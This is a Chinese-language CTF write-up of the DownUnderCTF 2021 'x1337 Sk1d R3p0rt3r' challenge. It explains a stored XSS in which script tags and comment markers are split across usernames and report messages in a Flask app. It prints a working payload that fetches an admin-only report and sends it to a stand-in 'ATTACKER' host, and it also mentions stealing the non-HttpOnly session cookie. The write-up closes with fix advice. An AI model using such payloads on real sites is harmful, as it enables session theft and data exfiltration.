# DownUnderCTF 2021 - x1337 Sk1d R3p0rt3r

## 题目简述

报告查看页把“当前用户名”和“历史报告中保存的用户名”用 `Markup` 标记为安全，消息正文则正常转义。由于用户名可在两次报告之间修改，可以把一个 `<script>` 标签及 JavaScript 注释边界拆进当前用户名、当前消息和历史用户名三个位置，拼成跨记录的存储型 XSS。管理员机器人触发后即可读取仅管理员可见的第一份报告，其中保存着 flag。

## 解题过程

### 分析三个不同的输出来源

创建报告时，应用额外给当前用户名拼接一个 `>`，再保存到报告快照：

```python
username = current_user.username + '>'
report = Reports(
    username=username,
    user_id=current_user.id,
    message=msg,
)
```

查看某份报告时却同时使用用户表中的当前用户名和历史报告中的快照：

```python
username = Markup(report.user.username)

for previous in older_reports:
    previous_reports.append([
        Markup(previous.username),
        Markup.escape(previous.message),
    ])
```

模板中的当前消息仍会自动 HTML 转义。于是可以把无法单字段提交的标签拆成多段，并使用 `/* ... */` 让中间生成的 HTML 落入 JavaScript 注释。

### 构造跨报告脚本

操作顺序如下：

1. 把用户名改成 `*/</script`，末尾故意不写 `>`；
2. 创建第一份内容任意的报告，保存时应用追加 `>`，历史快照恰好成为 `*/</script>`；
3. 把当前用户名改成 `<script>/*`；
4. 创建第二份报告，消息写成 `*/ PAYLOAD /*`。

查看第二份报告时，各处内容最终近似拼接为：

```html
<script>/* -> */ PAYLOAD /*
...中间由模板生成但被注释的 HTML...
*/</script>
```

当前用户名打开 `<script>` 和块注释，第二份消息暂时关闭注释并执行 payload，然后再次打开注释；第一份历史报告保存的用户名最终关闭注释和标签。

### 读取管理员报告

数据库初始化时创建的报告 ID 1 属于管理员，消息中包含 flag。管理员机器人能访问它，因此第二份报告的消息可写为：

```text
*/fetch(`/report/1`).then(function(r){return r.text()}).then(function(t){new Image().src=`https://ATTACKER/?d=`+btoa(t)})/*
```

这里避免使用箭头函数，因为其中的 `>` 会被自动转义为 `&gt;`，在 `<script>` 原始文本中不会还原；字符串也使用反引号，避免普通引号被转成 HTML 实体。另一种更短的做法是外带 `document.cookie`：应用明确设置 `SESSION_COOKIE_HTTPONLY=False`，取得管理员 session 后再自行请求 `/report/1`。

提交第二份报告后点击“Send Report to Admin”。机器人以管理员身份打开页面，跨记录脚本执行；将接收到的 Base64 页面解码即可找到：

```text
DUCTF{xxX_x55_4_1337_h4x0rz_Xxx}
```

## 方法总结

本题说明输出编码必须按最终上下文处理，不能因为字段来自数据库或已在另一处转义就使用 `Markup`。可变用户名、报告快照和模板循环让攻击者把一个脚本跨多条记录拼接出来。修复应移除对用户内容的 `Markup`，保持 Jinja 自动转义，给 session Cookie 设置 `HttpOnly`，并用 CSP 限制内联脚本；报告机器人还应在隔离会话中访问不可信页面。
